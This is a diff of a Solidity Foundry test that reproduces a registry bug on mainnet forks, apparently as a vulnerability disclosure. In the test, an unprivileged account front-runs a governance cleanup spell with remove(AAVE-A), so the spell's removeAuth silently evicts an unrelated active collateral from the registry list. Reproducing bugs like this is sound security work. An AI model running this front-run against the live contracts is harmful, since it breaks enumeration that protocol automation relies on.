@@ -113,55 +113,79 @@ contract IlkRegistryRemovalRaceTest is Test {
         );
     }
 
-    /// @notice A permissionless pre-removal makes the real governance spell remove
-    /// an unrelated ilk because removeAuth() accepts a missing key and _remove()
-    /// interprets the missing mapping entry's default pos as array index zero.
+    /// @notice Differential reproduction using two independent forks of the same
+    /// pre-cast block. The only difference is one permissionless remove(AAVE-A)
+    /// transaction before the real executive spell is cast.
     function testRealSpellFrontRunSilentlyRemovesUnrelatedActiveIlk() public {
-        assertEq(registry.join(AAVE_A), AAVE_JOIN, "AAVE-A must be registered before the real cleanup spell");
+        uint256 cleanFork = vm.createFork("mainnet", PRE_CAST_BLOCK);
+        uint256 attackFork = vm.createFork("mainnet", PRE_CAST_BLOCK);
+
+        // Clean execution establishes the exact governance-intended final registry.
+        vm.selectFork(cleanFork);
+        uint256 initialCount = registry.count();
+        _castRealCleanupSpell();
+        uint256 cleanCount = registry.count();
+        bytes32[] memory cleanList = registry.list();
+
+        assertEq(
+            cleanCount,
+            initialCount - SPELL_REMOVE_AUTH_CALLS,
+            "clean control did not remove exactly 42 entries"
+        );
+
+        // Attacked execution differs by one unprivileged call during the GSM window.
+        vm.selectFork(attackFork);
+        assertEq(registry.join(AAVE_A), AAVE_JOIN, "AAVE-A must be registered before the cleanup spell");
         assertEq(JoinLike(AAVE_JOIN).live(), 0, "AAVE-A join must already be caged");
         assertTrue(registry.class(AAVE_A) == 1 || registry.class(AAVE_A) == 2, "AAVE-A must be publicly removable");
 
-        uint256 initialCount = registry.count();
-
-        // Attacker uses the intentionally permissionless removal entrypoint during
-        // the multi-day schedule-to-cast window.
         vm.prank(attacker);
         registry.remove(AAVE_A);
         assertEq(registry.count(), initialCount - 1, "attacker pre-removal failed");
         assertEq(registry.join(AAVE_A), address(0), "AAVE-A metadata should now be deleted");
 
-        // This is the unrelated entry that removeAuth(AAVE-A) will silently evict.
-        bytes32 unrelated = registry.get(0);
-        address unrelatedJoin = registry.join(unrelated);
-        (uint256 unrelatedArt,,, uint256 unrelatedLine,) = vat.ilks(unrelated);
-
-        assertTrue(unrelated != AAVE_A, "victim must be unrelated to AAVE-A");
-        assertTrue(unrelatedJoin != address(0), "victim must be a real registered ilk");
-        assertTrue(unrelatedArt != 0 || unrelatedLine != 0, "victim must be economically active in Vat");
-        assertTrue(_listed(unrelated), "victim must be enumerable before the spell");
-
-        // Execute the actual August 7, 2025 executive spell, not a mock call.
         _castRealCleanupSpell();
 
-        // Clean execution removes 42 targets. The attacker transaction causes one
-        // additional pop when removeAuth(AAVE-A) operates on the now-missing key.
-        assertEq(
-            registry.count(),
-            initialCount - SPELL_REMOVE_AUTH_CALLS - 1,
-            "attack did not cause one extra unrelated removal"
-        );
+        // Every removeAuth call still pops once. The pre-removal therefore causes
+        // exactly one additional array entry to be lost versus the clean execution.
+        assertEq(registry.count(), cleanCount - 1, "attack did not cause one extra removal");
 
-        // Mapping/array invariants are now broken: metadata still says the unrelated
-        // ilk exists at pos 0, while list/get no longer contains it. Core Vat state
-        // remains active, so list-based automation silently loses the live collateral.
-        assertEq(registry.join(unrelated), unrelatedJoin, "victim metadata was unexpectedly deleted");
-        assertEq(registry.pos(unrelated), 0, "victim keeps a stale position");
-        assertFalse(_listed(unrelated), "victim was silently removed from enumeration");
-        assertTrue(registry.get(0) != unrelated, "index zero was not replaced");
+        // Find an economically active entry that survived the clean spell but is
+        // absent after the attacked spell. This avoids assuming any array ordering
+        // and remains valid even if stale positions cause cascading substitutions.
+        bytes32 victim;
+        address victimJoin;
+        uint256 victimArt;
+        uint256 victimLine;
 
-        (uint256 unrelatedArtAfter,,, uint256 unrelatedLineAfter,) = vat.ilks(unrelated);
-        assertEq(unrelatedArtAfter, unrelatedArt, "attack unexpectedly changed victim Art");
-        assertEq(unrelatedLineAfter, unrelatedLine, "attack unexpectedly changed victim line");
+        for (uint256 i = 0; i < cleanList.length; i++) {
+            bytes32 candidate = cleanList[i];
+            if (_listed(candidate)) continue;
+
+            address candidateJoin = registry.join(candidate);
+            (uint256 candidateArt,,, uint256 candidateLine,) = vat.ilks(candidate);
+            if (candidateJoin != address(0) && (candidateArt != 0 || candidateLine != 0)) {
+                victim = candidate;
+                victimJoin = candidateJoin;
+                victimArt = candidateArt;
+                victimLine = candidateLine;
+                break;
+            }
+        }
+
+        assertTrue(victim != bytes32(0), "no unintended active victim found");
+        assertFalse(_listed(victim), "victim unexpectedly remains enumerable");
+        assertEq(registry.join(victim), victimJoin, "victim mapping was not left as a ghost entry");
+
+        uint256 stalePos = registry.pos(victim);
+        assertTrue(stalePos < registry.count(), "victim position is outside the remaining array");
+        assertTrue(registry.get(stalePos) != victim, "victim mapping position is not stale");
+
+        // The attack changes only Registry enumeration; the economically active Vat
+        // state remains, so all list-based consumers silently omit a live collateral.
+        (uint256 victimArtAfter,,, uint256 victimLineAfter,) = vat.ilks(victim);
+        assertEq(victimArtAfter, victimArt, "attack unexpectedly changed victim Art");
+        assertEq(victimLineAfter, victimLine, "attack unexpectedly changed victim line");
     }
 
     /// @notice Minimal reproduction of the same bug, independent of the historical
@@ -181,10 +205,13 @@ contract IlkRegistryRemovalRaceTest is Test {
         vm.prank(PAUSE_PROXY);
         registry.removeAuth(AAVE_A); // AAVE-A is already absent.
 
-        assertEq(registry.count(), countBeforeAuthRemoval - 1, "missing key still popped the array");
+        assertEq(registry.count(), countBeforeAuthRemoval - 1, "missing key did not pop the array");
         assertEq(registry.join(victim), victimJoin, "victim mapping remains as a ghost entry");
         assertFalse(_listed(victim), "victim disappeared from list");
-        assertEq(registry.pos(victim), 0, "victim position is stale");
+
+        uint256 stalePos = registry.pos(victim);
+        assertTrue(stalePos < registry.count(), "victim stale position is out of bounds");
+        assertTrue(registry.get(stalePos) != victim, "victim position was not corrupted");
     }
 
     /// @notice After the real governance cleanup, add() also accepts the caged AAVE
